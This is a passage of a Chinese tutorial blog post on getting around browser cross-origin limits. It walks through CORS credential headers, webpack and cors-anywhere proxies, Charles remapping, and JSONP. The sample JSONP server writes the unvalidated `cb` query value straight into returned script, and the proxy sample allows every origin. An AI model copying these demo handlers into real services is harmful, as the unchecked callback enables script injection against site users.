class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原生 xml 的设置方式</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// axios 设置方式</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>2.<code>Access-Control-Allow-Credentials</code> 为 <code>true</code><br />3.<code>Access-Control-Allow-Origin</code>为非 <code>*</code><br />这里请求的方式，在 <code>chrome</code> 中是能看到返回值的，但是只要不满足以上其一，浏览器会报错，获取不到返回值。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176797624-53050b7f-68f9-4d79-b68f-70b5e2a29bfa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176797624-53050b7f-68f9-4d79-b68f-70b5e2a29bfa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://127.0.0.1:8080/api/corslist&#x27; from origin &#x27;http://127.0.0.1:8000&#x27; has been blocked by CORS policy: The value of the &#x27;Access-Control-Allow-Credentials&#x27; header in the response is &#x27;&#x27; which must be &#x27;true&#x27; when the request&#x27;s credentials mode is &#x27;include&#x27;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176807272-38d18a37-775a-4b63-bc69-d677a0add511.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176807272-38d18a37-775a-4b63-bc69-d677a0add511.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://127.0.0.1:8080/api/corslist&#x27; from origin &#x27;http://127.0.0.1:8000&#x27; has been blocked by CORS policy: The value of the &#x27;Access-Control-Allow-Origin&#x27; header in the response must not be the wildcard &#x27;*&#x27; when the request&#x27;s credentials mode is &#x27;include&#x27;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176815558-f9434297-a007-4a69-b00f-920142a35cda.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176815558-f9434297-a007-4a69-b00f-920142a35cda.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="ljQmC"></a></p><h4 id="前端示例"><a href="#前端示例" class="headerlink" title="前端示例"></a>前端示例</h4><p>分别演示一下前端部分 <code>简单请求</code> 和 <code>非简单请求</code></p><p><a name="KzKmL"></a></p><h5 id="简单请求-1"><a href="#简单请求-1" class="headerlink" title="简单请求"></a>简单请求</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8080/api/corslist&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="jZPPo"></a></p><h5 id="非简单请求-1"><a href="#非简单请求-1" class="headerlink" title="非简单请求"></a>非简单请求</h5><p>这里我们加入了一个非集合内的 <code>header</code> 头 <code>cc</code> 来达到非简单请求的目的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8080/api/corslist&quot;</span>, &#123; <span class="attr">header</span>: &#123; <span class="attr">cc</span>: <span class="string">&quot;xxx&quot;</span> &#125; &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176826917-6898e954-0a04-47fe-b3d1-2cc1c5bff30b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176826917-6898e954-0a04-47fe-b3d1-2cc1c5bff30b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="C1AVM"></a></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>1、 在新版的 chrome 中，如果你发送了复杂请求，你却看不到 <code>options</code> 请求。可以在这里设置 <code>chrome://flags/#out-of-blink-cors</code> 设置成 <code>disbale</code> ，重启浏览器。对于非简单请求就能看到 <code>options</code> 请求了。<br />2、 一般情况下后端接口是不会开启这个跨域头的，除非是一些与用户无关的不太重要的接口。</p><p><a name="SGGpx"></a></p><h3 id="Node-正向代理"><a href="#Node-正向代理" class="headerlink" title="Node 正向代理"></a>Node 正向代理</h3><p>代理的思路为，利用服务端请求不会跨域的特性，让接口和当前站点同域。<br /><strong>代理前</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176895466-02944916-21d4-4954-9611-3e7d1a11814d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589176895466-02944916-21d4-4954-9611-3e7d1a11814d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />这样，所有的资源以及请求都在一个域名下了。<br><a name="wOcP4"></a></p><h4 id="cli-工具中的代理"><a href="#cli-工具中的代理" class="headerlink" title="cli 工具中的代理"></a>cli 工具中的代理</h4><p><a name="LoJVV"></a></p><h5 id="1-Webpack-4-x"><a href="#1-Webpack-4-x" class="headerlink" title="1) Webpack (4.x)"></a>1) Webpack (4.x)</h5><p>在<code>webpack</code>中可以配置<code>proxy</code>来快速获得接口代理的能力。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">index</span>: <span class="string">&quot;./index.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">filename</span>: <span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;webpack.html&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>前端接口请求省略。<br />脚手架中都会有关于代理的详细配置，这里省略。这些配置都是有着共同的底层包 <code>http-proxy-middleware</code> ，里面需要用到的各种 <code>websocket</code> ，<code>rewrite</code> 等功能，直接看这个库的配置就可以了。<br><a name="E68in"></a></p><h4 id="使用自己的代理工具"><a href="#使用自己的代理工具" class="headerlink" title="使用自己的代理工具"></a>使用自己的代理工具</h4><p><strong>cors-anywhere</strong><br /><strong>服务端：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listen on a specific host via the HOST environment variable</span></span><br><span class="line"><span class="keyword">var</span> host = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line"><span class="comment">// Listen on a specific port via the PORT environment variable</span></span><br><span class="line"><span class="keyword">var</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">7777</span>;</span><br><span class="line"><span class="keyword">var</span> cors_proxy = <span class="built_in">require</span>(<span class="string">&quot;cors-anywhere&quot;</span>);</span><br><span class="line">cors_proxy</span><br><span class="line">  .<span class="title function_">createServer</span>(&#123;</span><br><span class="line">    <span class="attr">originWhitelist</span>: [], <span class="comment">// Allow all origins</span></span><br><span class="line">    <span class="attr">requireHeader</span>: [<span class="string">&quot;origin&quot;</span>, <span class="string">&quot;x-requested-with&quot;</span>],</span><br><span class="line">    <span class="attr">removeHeaders</span>: [<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;cookie2&quot;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">listen</span>(port, host, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Running CORS Anywhere on &quot;</span> + host + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>前端代码：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:7777/http://127.0.0.1:8080/api/corslist&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">post</span>(<span class="string">&quot;http://127.0.0.1:7777/http://127.0.0.1:8080/api/login&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果展示：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589184916263-4d343acc-4804-45b0-9e9d-296d430341f6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589184916263-4d343acc-4804-45b0-9e9d-296d430341f6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="c-charles"></a></p><h4 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h4><p><a name="lWcvV"></a></p><h5 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h5><p>这是一个测试、开发的神器。<a href="https://juejin.im/post/5b8350b96fb9a019d9246c4c">介绍与使用</a><br />利用 charles 进行跨域，本质就是请求的拦截与代理。<br />在 <code>tools/map remote</code> 中设置代理<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589185019849-762cb0a5-1010-4925-8a33-216d57bc0ac1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589185019849-762cb0a5-1010-4925-8a33-216d57bc0ac1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="kzdel"></a></p><h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><p><a name="rdguw"></a></p><h5 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;getlist&quot;</span>&gt;</span>获取列表<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">get</span>(<span class="string">&quot;/api/corslist&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="pdvPw"></a></p><h5 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(&quot;/api/corslist&quot;, async ctx =&gt; &#123;</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    data: [&#123; name: &quot;秋风的笔记&quot; &#125;]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&quot;/api/login&quot;, async ctx =&gt; &#123;</span><br><span class="line">  ctx.cookies.set(&quot;token&quot;, token, &#123;</span><br><span class="line">    expires: new Date(+new Date() + 1000 * 60 * 60 * 24 * 7)</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    msg: &quot;成功&quot;,</span><br><span class="line">    code: 0</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="sNw7N"></a></p><h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>访问 <a href="http://localhost:8000/charles">http://localhost:8000/charles</a><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589185019811-c9644b6e-6fab-4115-bc8a-f46fca8dddc0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589185019811-c9644b6e-6fab-4115-bc8a-f46fca8dddc0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="KYmI3"></a></p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p><code>JSONP</code> 主要就是利用了 <code>script</code> 标签没有跨域限制的这个特性来完成的。<br><a name="mLEgV"></a></p><h4 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h4><p>仅支持 GET 方法，如果想使用完整的 REST 接口，请使用 CORS 或者其他代理方式。<br><a name="redp6"></a></p><h4 id="流程解析"><a href="#流程解析" class="headerlink" title="流程解析"></a>流程解析</h4><p>1.前端定义解析函数（例如 jsonpCallback&#x3D;function(){….}）<br />2.通过 params 形式包装请求参数，并且声明执行函数(例如 cb&#x3D;jsonpCallback)<br />3.后端获取前端声明的执行函数（jsonpCallback），并以带上参数并调用执行函数的方式传递给前端。<br><a name="oM4cK"></a></p><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>后端实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx.<span class="property">path</span> === <span class="string">&quot;/api/jsonp&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; cb, msg &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">`<span class="subst">$&#123;cb&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; msg &#125;)&#125;</span>)`</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>普通 js 示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/api/jsonp?msg=hello&amp;cb=jsonpCallback&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>JQuery Ajax 示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.5.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  $.<span class="title function_">ajax</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">url</span>: <span class="string">&quot;http://localhost:8080/api/jsonp&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">type</span>: <span class="string">&quot;get&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">msg</span>: <span class="string">&quot;hello&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">jsonp</span>: <span class="string">&quot;cb&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><a name="aRz5M"></a></p><h4 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h4><p>其实这就是 js 的魔法<br />我们先来看最简单的 js 调用。嗯，很自然的调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  jsonpCallback(&#123; a: 1 &#125;);</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们稍稍改造一下，外链的形式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/api/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">// http://localhost:8080/api/a.js jsonpCallback(&#123;a:1&#125;);</span></span><br></pre></td></tr></table></figure><p>我们再改造一下，我们把这个外链的 js 就当做是一个动态的接口，因为本身资源和接口一样，是一个请求，也包含各种参数，也可以动态化返回。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/api/a.js?a=123&amp;cb=sonpCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">// 